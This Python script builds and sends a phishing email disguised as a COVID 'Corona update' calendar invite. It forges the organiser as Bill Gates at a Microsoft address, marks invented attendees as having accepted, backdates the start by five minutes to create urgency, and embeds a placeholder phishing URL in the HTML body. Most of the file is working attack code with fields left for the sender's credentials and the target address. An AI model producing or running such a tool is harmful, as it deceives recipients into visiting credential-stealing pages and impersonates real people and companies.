import time
import codecs
import smtplib
import datetime
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate


# smtp settings
SERVER = 'smtp.gmail.com'
PORT = 587
USER_EMAIL = "<email>"
USER_PASS = "<password>"

# email settings
EMAIL_SUBJECT = "Corona Meeting"

# event settings
EVENT_DESCRIPTION = "Corona Update Meeting"
EVENT_SUMMARY = "Corona update meeting"

ORGANIZER_NAME = "Bill Gates"
ORGANIZER_EMAIL = "bill@microsoft.com"
ATTENDEES = ["bob@microsoft.com", "john@microsoft.com"]

# template settings
EVENT_TEXT = "Corona update"
EVENT_URL = "https://phishing-url-here"


def load_template():
    template = ""
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        template = f.read()
    return template


def prepare_template():
    email_template = load_template()
    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=EVENT_URL)
    return email_template


def load_ics():
    ics = ""
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        ics = f.read()
    return ics


def prepare_ics(dtstamp, dtstart, dtend):
    ics_template = load_ics()
    ics_template = ics_template.format(DTSTAMP=dtstamp, DTSTART=dtstart, DTEND=dtend, ORGANIZER_NAME=ORGANIZER_NAME, ORGANIZER_EMAIL=ORGANIZER_EMAIL, DESCRIPTION=EVENT_DESCRIPTION, SUMMARY=EVENT_SUMMARY, ATTENDEES=generate_attendees())
    return ics_template


def generate_attendees():
    attendees = []
    for attendee in ATTENDEES:
        attendees.append("ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee))
    return "\r\n".join(attendees)


def send_email(to):
    print ('Sending email to: ' + to)

    # in .ics file timezone is set to be utc
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now()
    dtoff = datetime.timedelta(minutes=utc_offset + 5) # meeting has started 5 minutes ago
    duration = datetime.timedelta(hours = 1)  # meeting duration
    ddtstart = ddtstart - dtoff
    dtend = ddtstart + duration
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend)

    email_body = prepare_template()

    msg = MIMEMultipart('mixed')
    msg['Reply-To']=USER_EMAIL
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = USER_EMAIL
    msg['To'] = to

    part_email = MIMEText(email_body,"html")
    part_cal = MIMEText(ics,'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    ics_atch = MIMEBase('application/ics',' ;name="%s"' % ("invite.ics"))
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % ("invite.ics"))

    eml_atch = MIMEBase('text/plain','')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    mailServer = smtplib.SMTP(SERVER, PORT)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(USER_EMAIL, USER_PASS)
    mailServer.sendmail(USER_EMAIL, to, msg.as_string())
    mailServer.close()


def main():
    send_email("<target-email>")


main()
